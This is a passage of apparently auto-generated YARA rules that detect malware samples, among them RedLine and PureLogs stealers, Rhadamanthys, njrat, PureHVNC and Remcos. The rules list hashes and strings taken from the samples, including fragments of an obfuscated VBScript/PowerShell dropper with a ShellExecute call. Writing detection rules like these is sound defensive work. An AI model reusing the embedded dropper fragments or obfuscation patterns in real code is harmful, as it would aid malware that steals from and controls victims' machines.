      $s13 = "sSmxjMjkxY21ObGN5NVNaWE52ZFhKalpWSmxZV1JsY2l3Z2JYTmpiM0pzYVdJc0lGWmxjbk5wYjI0OU5DNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWR" ascii /* base64 encoded string 'Jlc291cmNlcy5SZXNvdXJjZVJlYWRlciwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQd' */ /* score: '24.00'*/
      $s14 = "aTUFnQzRBQUFnQWt3RHFDMDhDa3dDY0xnQUFDQUNUQVAwTG5RT1RBTGd1QUFBSUFKTUFRd3kxQTVNQThDOEFBQWdBaGhoVUFEY0FsQUFNTUFBQUNBQ1JHQkVIcmdHVUF" ascii /* base64 encoded string 'MAgC4AAAgAkwDqC08CkwCcLgAACACTAP0LnQOTALguAAAIAJMAQwy1A5MA8C8AAAgAhhhUADcAlAAMMAAACACRGBEHrgGUA' */ /* score: '24.00'*/
      $s15 = "YUnlZV3dzSUZCMVlteHBZMHRsZVZSdmEyVnVQV0kzTjJFMVl6VTJNVGt6TkdVd09EbG1VM2x6ZEdWdExrUnlZWGRwYm1jdVUybDZaU3dnVTNsemRHVnRMa1J5WVhkcGJ" ascii /* base64 encoded string 'RyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODlmU3lzdGVtLkRyYXdpbmcuU2l6ZSwgU3lzdGVtLkRyYXdpb' */ /* score: '24.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 7000KB and
      1 of ($x*) and 4 of them
}

rule NetSupport_signature__6c9b9518 {
   meta:
      description = "_subset_batch - file NetSupport(signature)_6c9b9518.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6c9b951839dbf6b7a79a582fa2089536f4cb9ed0dcbbae78ee7f31b7af261aa5"
   strings:
      $s1 = "client32u.ini" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 60KB and
      all of them
}

rule PureHVNC_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__2d52e263 {
   meta:
      description = "_subset_batch - file PureHVNC(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_2d52e263.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2d52e2639e0bdc15eba878ad071ccdf1f331c1486e829f621c4b01b9788b3a02"
   strings:
      $s1 = "VRIN_AnnitApps_XI8824LTCR.exe" fullword wide /* score: '19.00'*/
      $s2 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '17.00'*/
      $s3 = "&MTdSXmxv" fullword ascii /* base64 encoded string '17R^lo' */ /* score: '14.00'*/
      $s4 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s5 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '12.00'*/
      $s6 = "KltTools_Getnit_Version020567535l" fullword wide /* score: '12.00'*/
      $s7 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s8 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s9 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s10 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s11 = "c:\\min" fullword ascii /* score: '10.00'*/
      $s12 = "5%r:\\&" fullword ascii /* score: '9.50'*/
      $s13 = "1* -n'" fullword ascii /* score: '9.00'*/
      $s14 = "GwEYEdQ" fullword ascii /* score: '9.00'*/
      $s15 = "* <LCZ" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 31000KB and
      8 of them
}

rule PureHVNC_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__4255a9d7 {
   meta:
      description = "_subset_batch - file PureHVNC(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_4255a9d7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "4255a9d71566a2da0b722e609d2c6b5d79fa6e307f46ad98fd134ecd2aa035ca"
   strings:
      $s1 = "COLLE_K5470310284_fIDDROn.exe" fullword wide /* score: '19.00'*/
      $s2 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '17.00'*/
      $s3 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s4 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '12.00'*/
      $s5 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s6 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s7 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s8 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s9 = "^I:\\o -`8" fullword ascii /* score: '11.00'*/
      $s10 = "@/dump" fullword ascii /* score: '11.00'*/
      $s11 = "!!!- 9" fullword ascii /* score: '10.00'*/
      $s12 = "iwjI:\\" fullword ascii /* score: '10.00'*/
      $s13 = "YW%r:\\?7" fullword ascii /* score: '9.50'*/
      $s14 = "lOgf$\\" fullword ascii /* score: '9.00'*/
      $s15 = "h/logstrauu" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30000KB and
      8 of them
}

rule PureHVNC_signature__a56f115ee5ef2625bd949acaeec66b76_imphash__5f10239a {
   meta:
      description = "_subset_batch - file PureHVNC(signature)_a56f115ee5ef2625bd949acaeec66b76(imphash)_5f10239a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5f10239a9c29edb0f5672606850e3a1d236ec846c454ceeb9da0c7a88d5efdde"
   strings:
      $s1 = "PirmiliPEdvs_BIL57FRH504WCV.exe" fullword wide /* score: '19.00'*/
      $s2 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '17.00'*/
      $s3 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s4 = "       Makes the application long-path aware. See https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitation -" ascii /* score: '12.00'*/
      $s5 = "        <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\" />" fullword ascii /* score: '11.00'*/
      $s6 = "             requestedExecutionLevel node with one of the following." fullword ascii /* score: '11.00'*/
      $s7 = "       to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should " fullword ascii /* score: '11.00'*/
      $s8 = "            Specifying requestedExecutionLevel element will disable file and registry virtualization. " fullword ascii /* score: '11.00'*/
      $s9 = "!!!- 9" fullword ascii /* score: '10.00'*/
      $s10 = "c:\\m9in" fullword ascii /* score: '10.00'*/
      $s11 = "!!!- 9Ph" fullword ascii /* score: '10.00'*/
      $s12 = "7@p* /i" fullword ascii /* score: '9.00'*/
      $s13 = "t\\ /b:y" fullword ascii /* score: '9.00'*/
      $s14 = "* eK;3" fullword ascii /* score: '9.00'*/
      $s15 = "* imG:" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 31000KB and
      8 of them
}

rule NetSupport_signature__7d291039 {
   meta:
      description = "_subset_batch - file NetSupport(signature)_7d291039.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7d291039ea1cc8bf2f69c7394f0db9e6137c761d61e462777f68eb0e3a89db17"
   strings:
      $s1 = "CLIENT32.INI" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 80KB and
      all of them
}

rule NetSupport_signature__78a0b5d5 {
   meta:
      description = "_subset_batch - file NetSupport(signature)_78a0b5d5.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "78a0b5d545fc4823e90b701641b0d295fc74ac9bf5884fe20e9ac5760ac38aa0"
   strings:
      $s1 = "client32.ini}" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1KB and
      all of them
}

rule NetSupport_signature__b713d225 {
   meta:
      description = "_subset_batch - file NetSupport(signature)_b713d225.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b713d225d35506e6158e798ea1735a08306047af235841c034ea6152642335a7"
   strings:
      $s1 = "client32.ini}" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 1KB and
      all of them
}

rule njrat_signature_ {
   meta:
      description = "_subset_batch - file njrat(signature).xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aea2d24f87ce0cb0b2618065d1031635d1ec602dfcc168c5d6607ad3012fb2ed"
   strings:
      $s1 = "** s\"p" fullword ascii /* score: '9.00'*/
      $s2 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule PureLogsStealer_signature__3 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature).xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f36816c3559b267a525841a1c3fd98c52a4507f2a692589874ba55e7abf7d513"
   strings:
      $s1 = "Gvl8RHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH" ascii /* score: '11.00'*/
      $s2 = "[Content_Types].xmlUT" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule njrat_signature__2 {
   meta:
      description = "_subset_batch - file njrat(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f13c492ff81fbb21eb0f3a528c2737303c9817825de78d5d942f52588dde511c"
   strings:
      $s1 = "ti/Direct3D.dll" fullword ascii /* score: '20.00'*/
      $s2 = "ti/DirectX 9.dll" fullword ascii /* score: '20.00'*/
      $s3 = "ti/d3dxof.dll" fullword ascii /* score: '20.00'*/
      $s4 = "ti/VirtualizerSDK32.dll" fullword ascii /* score: '20.00'*/
      $s5 = "ti/DirectX 9.exe" fullword ascii /* score: '19.00'*/
      $s6 = "pppppppppppppppppppppppppppppppppppppppppp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 6000KB and
      all of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash__0066b00d {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_0066b00d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0066b00dc67373c4034d672c76e5cb13a37f789c91ea84f10e7afe93ba4bb481"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v3.66.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s6 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s7 = " detection. ThreatGuard Innovations ScanTiger Advanced scanning for threat detection. ThreatGuard Innovations ScanTiger Advanced" ascii /* score: '9.00'*/
      $s8 = "Guard Innovations ScanTiger Advanced scanning for threat detection. ThreatGuard Innovations ScanTiger Advanced scanning for thre" ascii /* score: '9.00'*/
      $s9 = "ThreatGuard Innovations ScanTiger Advanced scanning for threat detection. ThreatGuard Innovations ScanTiger Advanced scanning fo" ascii /* score: '9.00'*/
      $s10 = "Tiger Advanced scanning for threat detection. ThreatGuard Innovations ScanTiger Advanced scanning for threat detection. ThreatGu" ascii /* score: '9.00'*/
      $s11 = "ed scanning for threat detection. ThreatGuard Innovations ScanTiger Advanced scanning for threat detection. ThreatGuard Innovati" ascii /* score: '9.00'*/
      $s12 = ".lOg%" fullword ascii /* score: '9.00'*/
      $s13 = "tion. ThreatGuard Innovations ScanTiger Advanced scanning for threat detection. ThreatGuard Innovations ScanTiger Advanced scann" ascii /* score: '9.00'*/
      $s14 = "r Advanced scanning for threat detection. ThreatGuard Innovations ScanTiger Advanced scanning for threat detection. ThreatGuard " ascii /* score: '9.00'*/
      $s15 = ". ThreatGuard Innovations ScanTiger Advanced scanning for threat detection. ThreatGuard Innovations ScanTiger Advanced scanning " ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 31000KB and
      1 of ($x*) and 4 of them
}

rule Rhadamanthys_signature__32f3282581436269b3a75b6675fe3e08_imphash__e9dc8c8d {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_32f3282581436269b3a75b6675fe3e08(imphash)_e9dc8c8d.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e9dc8c8d4f02a2ac33f810bd54c6b17879fc124ff3a5b89f27d7c147e6c5bf8c"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v1.96.6-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "<*<5<D<`<" fullword ascii /* score: '9.00'*/ /* hex encoded string ']' */
      $s6 = ">,>3>>>F>{>" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Rhadamanthys_signature__b729b61eb1515fcf7b3e511e4e66258b_imphash__f952862b {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_b729b61eb1515fcf7b3e511e4e66258b(imphash)_f952862b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f952862b20218f50c028a60c9d62eb3ee9fda8eb79eaf5d7fb737df776f42004"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v9.86.9-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "%y:\\cy" fullword ascii /* score: '9.50'*/
      $s6 = "- -h+{b" fullword ascii /* score: '9.00'*/
      $s7 = "3\"\"6\\|" fullword ascii /* score: '9.00'*/ /* hex encoded string '6' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__89140359 {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_89140359.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "891403591d4738917f75065dd7500ab87eead7efb9d6ada3ff8922de11c740e0"
   strings:
      $x1 = "sYgcdvgJl/SfqIMcHzF0kj0tesjCUv5pgTjmsNcULhRKwEY7gI9t41Ag26FqEWfqA/4h6SOcJ3YGdS1VMgtvRDWIImEXR9lM616GpXdlw8TUkf8wecGwnQ2gZgAIGewA" wide /* score: '61.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s4 = "acI59UTTtFyf2pwZU2.ihtyLkmxXFjRRiFKTV+epeEmHO7ZFpLKoOVW2+kou2l6odGWLN55hKue`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '27.00'*/
      $s5 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s6 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s7 = "minors11.exe" fullword wide /* score: '22.00'*/
      $s8 = "acI59UTTtFyf2pwZU2.ihtyLkmxXFjRRiFKTV+epeEmHO7ZFpLKoOVW2+kou2l6odGWLN55hKue`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '18.00'*/
      $s9 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s10 = "PiFAKTVVc" fullword ascii /* base64 encoded string '>!@)5U' */ /* score: '14.00'*/
      $s11 = "YjE2ZDQ3aW1rNnB2YWJ0Yw==" fullword wide /* base64 encoded string 'b16d47imk6pvabtc' */ /* score: '14.00'*/
      $s12 = "WnYvMkZKN2p0UHpzYkxYVg==" fullword wide /* base64 encoded string 'Zv/2FJ7jtPzsbLXV' */ /* score: '14.00'*/
      $s13 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s14 = "=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s15 = "/######" fullword ascii /* reversed goodware string '######/' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8faabf8e {
   meta:
      description = "_subset_batch - file RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8faabf8e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8faabf8e2ea7309660569ed1812f692a6597faea2ed4327b77343d3cbd16befb"
   strings:
      $x1 = "sYgcdvgJl/SfqIMcHzF0kj0tesjCUv5pgTjmsNcULhRKwEY7gI9t41Ag26FqEWfqA/4h6SOcJ3YGdS1VMgtvRDWIImEXR9lM616GpXdlw8TUkf8wecGwnQ2gZgAIGewA" wide /* score: '61.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s4 = "Re8quZ2l3KCZxdlJl2.YrnXAos3iGG5FDvoEt+KwYuiGwIIeBm65ntw9+IhbN9k3NAISdcojUDM`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '27.00'*/
      $s5 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s6 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s7 = "minors1.exe" fullword wide /* score: '22.00'*/
      $s8 = "Re8quZ2l3KCZxdlJl2.YrnXAos3iGG5FDvoEt+KwYuiGwIIeBm65ntw9+IhbN9k3NAISdcojUDM`1[[System.Object, mscorlib, Version=4.0.0.0, Culture" ascii /* score: '18.00'*/
      $s9 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s10 = "YjE2ZDQ3aW1rNnB2YWJ0Yw==" fullword wide /* base64 encoded string 'b16d47imk6pvabtc' */ /* score: '14.00'*/
      $s11 = "WnYvMkZKN2p0UHpzYkxYVg==" fullword wide /* base64 encoded string 'Zv/2FJ7jtPzsbLXV' */ /* score: '14.00'*/
      $s12 = "JVBOJUQ5i" fullword ascii /* base64 encoded string '%PN%D9' */ /* score: '14.00'*/
      $s13 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s14 = "=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '13.00'*/
      $s15 = "/######" fullword ascii /* reversed goodware string '######/' */ /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule PureLogsStealer_signature__edbf6173 {
   meta:
      description = "_subset_batch - file PureLogsStealer(signature)_edbf6173.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "edbf6173c992263b470538b76abcfd8288cd5c78954bdfa18a98ce11cf3ea58b"
   strings:
      $s1 = "Fypcsbca.exe" fullword wide /* score: '18.00'*/
      $s2 = "Pk/g+x/xQ2T26Rb5DkL64BSyLEXg6hf+AU+oyB/oKFjn/QPdHkX24hjwFA306g7DK0P/4zT9AFOo4ArDJFj2/g/9AV/n9kH7CELMwx/yCkL7tD35GWLq/x/aH1n+xxvy" wide /* score: '16.00'*/
      $s3 = "mkleusberg@gmail.com0" fullword ascii /* score: '11.00'*/
      $s4 = "NNNrNNNdNNNUNNNCNNN.NNN" fullword ascii /* score: '10.00'*/
      $s5 = "Svvv.nnn" fullword ascii /* score: '10.00'*/
      $s6 = "Sjho:\"F" fullword ascii /* score: '10.00'*/
      $s7 = "hpSpYy,J" fullword ascii /* score: '9.00'*/
      $s8 = "wK.pwM* " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 10000KB and
      all of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__5c8df15c {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_5c8df15c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5c8df15cad706ebf3e5b47e36c1037124cace5bf582a7d7ea34c7450e2938255"
   strings:
      $s1 = "CryEngineLauncher.exe" fullword wide /* score: '22.00'*/
      $s2 = "XYYYYY" fullword ascii /* reversed goodware string 'YYYYYX' */ /* score: '16.50'*/
      $s3 = "YYYYYZ" fullword ascii /* reversed goodware string 'ZYYYYY' */ /* score: '16.50'*/
      $s4 = "XZYXXX" fullword ascii /* reversed goodware string 'XXXYZX' */ /* score: '13.50'*/
      $s5 = "ZYYZYY" fullword ascii /* reversed goodware string 'YYZYYZ' */ /* score: '13.50'*/
      $s6 = "CryEngine Launcher - Game Development Environment" fullword wide /* score: '12.00'*/
      $s7 = "A\\A\\A\\" fullword ascii /* reversed goodware string '\\A\\A\\A' */ /* score: '11.00'*/
      $s8 = "EuEg.Zin" fullword ascii /* score: '10.00'*/
      $s9 = "XXYYYYX" fullword ascii /* score: '9.50'*/
      $s10 = "YXYYYYX" fullword ascii /* score: '9.50'*/
      $s11 = "YYYYYXXY" fullword ascii /* score: '9.50'*/
      $s12 = "XXZYZYYYYZYZ" fullword ascii /* score: '9.50'*/
      $s13 = "YYYYXXZ" fullword ascii /* score: '9.50'*/
      $s14 = "QYYYYZY" fullword ascii /* score: '9.50'*/
      $s15 = "kSpyT\\)~" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 22000KB and
      8 of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__9a160ed5 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_9a160ed5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9a160ed5935ad498fa3b882d7753cbac2cc005516a1a883d31b23ce8218ce904"
   strings:
      $s1 = "CryEngineLauncher.exe" fullword wide /* score: '22.00'*/
      $s2 = "XYYYYY" fullword ascii /* reversed goodware string 'YYYYYX' */ /* score: '16.50'*/
      $s3 = "YZZZZZ" fullword ascii /* reversed goodware string 'ZZZZZY' */ /* score: '13.50'*/
      $s4 = "CryEngine Launcher - Game Development Environment" fullword wide /* score: '12.00'*/
      $s5 = "YXYYYYX" fullword ascii /* score: '9.50'*/
      $s6 = "ZXYZYYYYXY" fullword ascii /* score: '9.50'*/
      $s7 = "ZXYYYYXYY" fullword ascii /* score: '9.50'*/
      $s8 = "YZXYYYYX" fullword ascii /* score: '9.50'*/
      $s9 = "* kaa%" fullword ascii /* score: '9.00'*/
      $s10 = "drljzqb" fullword ascii /* score: '8.00'*/
      $s11 = "ZZYYYYZ3" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20000KB and
      8 of them
}

rule Rhadamanthys_signature__5ae8da8d195503ea36a6c31c6043ecb8_imphash__be0e8947 {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature)_5ae8da8d195503ea36a6c31c6043ecb8(imphash)_be0e8947.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "be0e8947bea0f5f39275e9484ffb7af5b2026b78b2c3c48b33762d899f9d1059"
   strings:
      $s1 = "CryEngineLauncher.exe" fullword wide /* score: '22.00'*/
      $s2 = "YYZZZZZZ" fullword ascii /* reversed goodware string 'ZZZZZZYY' */ /* score: '16.50'*/
      $s3 = "ZZZXXX" fullword ascii /* reversed goodware string 'XXXZZZ' */ /* score: '13.50'*/
      $s4 = "ZZZYZX" fullword ascii /* reversed goodware string 'XZYZZZ' */ /* score: '13.50'*/
      $s5 = "ZYYXXX" fullword ascii /* reversed goodware string 'XXXYYZ' */ /* score: '13.50'*/
      $s6 = "CryEngine Launcher - Game Development Environment" fullword wide /* score: '12.00'*/
      $s7 = "ZYYYYZX" fullword ascii /* score: '9.50'*/
      $s8 = "XXYYYYX" fullword ascii /* score: '9.50'*/
      $s9 = "ZZYYYYZZX" fullword ascii /* score: '9.50'*/
      $s10 = "YXXZYYYY" fullword ascii /* score: '9.50'*/
      $s11 = "YXZZYZYYYY" fullword ascii /* score: '9.50'*/
      $s12 = "ZXXXYYYY" fullword ascii /* score: '9.50'*/
      $s13 = "ZYYYYXYXZY" fullword ascii /* score: '9.50'*/
      $s14 = "ZYXZYYYY" fullword ascii /* score: '9.50'*/
      $s15 = "XZZXYYYYY" fullword ascii /* score: '9.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 21000KB and
      8 of them
}

rule RemcosRAT_signature__3 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "23f3ed5886a52500826d2fae53c2d8c8270f55ac101720a50bf47911376c0b3c"
   strings:
      $s1 = "Predicatable = Predicatable & \"Get-colongarnter;Get-Service;hoimulzKerbaya='B'+ [char]58;Get-hotfix;hoimulzSkodderne=(gcm  hoim" ascii /* score: '27.00'*/
      $s2 = "If Hofdame.FileExists(\"C:\\windows\\SYSTEM32\\CALC.exe\") Then" fullword ascii /* score: '21.00'*/
      $s3 = "execute \"Minicomputers = oRE.Rep\"+Bagtppernes+\"ace(Omsorgscentre, Teoriundervisnings)\"" fullword ascii /* score: '20.00'*/
      $s4 = "lzKerbaya).CommandType;hoimulzSkodderne=[String]hoimulzSkodderne;New-Aliaaxis -Name objectleaxisaxis -Vallongare ni;hoimulzSkodd" ascii /* score: '20.00'*/
      $s5 = "'loggings! nonpoisonousness172, plaskregn symphenomenal; tilkbte:" fullword ascii /* score: '19.00'*/
      $s6 = "Call Forevigelserne.ShellExecute(Gapeworm,repugnantness  & preperitoneal & repugnantness ,Filmanmeldelse,Brairding,0)" fullword ascii /* score: '18.00'*/
